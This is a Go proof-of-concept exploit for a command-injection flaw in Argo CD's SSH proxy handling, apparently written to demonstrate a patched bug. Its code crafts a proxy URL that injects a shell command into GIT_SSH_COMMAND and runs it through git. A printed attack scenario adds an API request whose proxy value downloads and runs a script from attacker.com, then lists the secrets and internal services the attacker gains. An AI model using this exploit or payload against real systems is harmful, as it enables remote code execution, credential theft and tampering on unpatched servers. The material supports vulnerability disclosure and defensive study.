// +build ignore

/*
CVE PoC: SSH ProxyCommand Injection in Argo CD

VULNERABILITY: util/git/creds.go builds GIT_SSH_COMMAND with unsanitized proxy hostname
IMPACT: Authenticated RCE on repo-server via repositories:create permission
FIXED IN: commit 5bbddf194

Run: go run poc_argocd_ssh_injection.go
*/

package main

import (
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"strings"
)

func main() {
	fmt.Println(strings.Repeat("=", 75))
	fmt.Println(" Argo CD SSH ProxyCommand Injection PoC")
	fmt.Println(strings.Repeat("=", 75))

	// Marker file - use current directory, no spaces or slashes
	os.Remove(".argocd_pwned")

	// Malicious proxy URL - the single quote breaks out of ProxyCommand quoting
	// $() is then executed by shell when git invokes SSH
	// Note: url.Parse blocks spaces, so we use redirection (no space needed)
	// $(>file) creates an empty file via shell redirection
	maliciousProxy := "socks5://x'$(>.argocd_pwned)'y:1080"

	fmt.Println("\n[STEP 1] Attacker crafts malicious proxy URL")
	fmt.Printf("         %s\n", maliciousProxy)

	// Parse URL - this is what Argo CD does
	parsed, err := url.Parse(maliciousProxy)
	if err != nil {
		fmt.Printf("Parse error: %v\n", err)
		return
	}

	hostname := parsed.Hostname()
	port := parsed.Port()

	fmt.Println("\n[STEP 2] Go url.Parse() extracts hostname (allows shell metacharacters!)")
	fmt.Printf("         Hostname: %s\n", hostname)
	fmt.Printf("         Port: %s\n", port)

	// VULNERABLE CODE from util/git/creds.go (before fix):
	//
	// args = append(args, "-o", fmt.Sprintf("ProxyCommand='connect-proxy -S %s:%s -5 %%h %%p'",
	//     parsedProxyURL.Hostname(),  // <-- UNSANITIZED!
	//     parsedProxyURL.Port()))
	//
	// env = append(env, []string{"GIT_SSH_COMMAND=" + strings.Join(args, " ")}...)

	gitSSHCommand := fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o ProxyCommand='connect-proxy -S %s:%s -5 %%h %%p'",
		hostname, port)

	fmt.Println("\n[STEP 3] Vulnerable code builds GIT_SSH_COMMAND")
	fmt.Printf("         %s\n", gitSSHCommand)

	fmt.Println("\n[STEP 4] Shell parses the command, breaking on quotes:")
	fmt.Println("         'connect-proxy -S x'    <- quoted string ENDS")
	fmt.Println("         $(touch /tmp/...)       <- COMMAND SUBSTITUTION!")
	fmt.Println("         'y:1080 -5 %h %p'       <- new quoted string")

	fmt.Println("\n[STEP 5] Executing via git (simulating Argo CD repo-server)...")

	// Set env and run git - this triggers SSH which triggers the injection
	cmd := exec.Command("git", "ls-remote", "git@10.255.255.1:test/repo.git")
	cmd.Env = append(os.Environ(), "GIT_SSH_COMMAND="+gitSSHCommand)
	cmd.CombinedOutput() // Ignore errors - connection will fail but injection runs

	// Check if exploit worked
	fmt.Println("\n[RESULT]")
	if _, err := os.Stat(".argocd_pwned"); err == nil {
		fmt.Println(strings.Repeat("!", 75))
		fmt.Println("!! SUCCESS: .argocd_pwned was created!")
		fmt.Println("!! Arbitrary command execution achieved!")
		fmt.Println(strings.Repeat("!", 75))
		os.Remove(".argocd_pwned")
	} else {
		fmt.Println("File not created - exploit may have failed")
		fmt.Printf("Error: %v\n", err)
	}

	fmt.Println("\n" + strings.Repeat("=", 75))
	fmt.Println(" ATTACK SCENARIO")
	fmt.Println(strings.Repeat("=", 75))
	fmt.Println(`
1. Attacker authenticates to Argo CD with 'repositories:create' permission

2. Attacker creates repository via API:
   
   curl -X POST https://argocd.example.com/api/v1/repositories \
     -H "Authorization: Bearer $TOKEN" \
     -d '{
       "repo": "git@github.com:victim/app.git",
       "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
       "proxy": "socks5://x'\''$(curl http://attacker.com/pwn.sh|sh)'\''y:1080"
     }'

3. Argo CD repo-server tests the repository connection

4. Git SSH command executes, shell parses ProxyCommand with injection

5. Attacker has RCE on repo-server with access to:
   - REDIS_PASSWORD environment variable  
   - Internal network (API server, Redis, Dex)
   - Cached repository data
   - Ability to tamper with manifest generation
`)
}
